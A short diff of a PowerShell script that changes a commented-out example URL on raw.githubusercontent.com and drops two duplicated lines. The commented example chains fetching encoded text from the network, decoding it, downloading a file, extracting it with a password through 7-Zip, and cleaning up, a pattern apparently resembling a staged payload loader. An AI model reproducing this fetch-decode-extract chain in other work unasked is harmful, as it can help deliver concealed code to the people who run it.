@@ -102,7 +102,7 @@ Function Cleanup {
 
 # Script Execution Example (Uncomment as needed for debugging)
 
-# $url = "https://raw.githubusercontent.com/1/1/main/8.txt"
+# $url = "https://raw.githubusercontent.com/notforuseactually/404/main/9.txt"
 # $rawText = FetchTextFromURL -url $url
 # $binaryString = Convert-EncodedStringToBinary -encodedString $rawText
 # $hexString = Convert-BinaryToHex -binaryString $binaryString
@@ -116,8 +116,6 @@ Function Cleanup {
 # UnzipFileWith7Zip -sevenZipCmdPath $sevenZipCmdPath -filePath $downloadPath -outputPath "$tempFolderPath\ExtractedFile" -password $password
 # Cleanup -folderPath $tempFolderPath
 
-# $rawText = FetchTextFromURL -url $url
-# $binaryString = Convert-EncodedStringToBinary -encodedString $rawText
 # if ($binaryString -ne $null) {
 #     $hexString = Convert-BinaryToHex -binaryString $binaryString
 # }
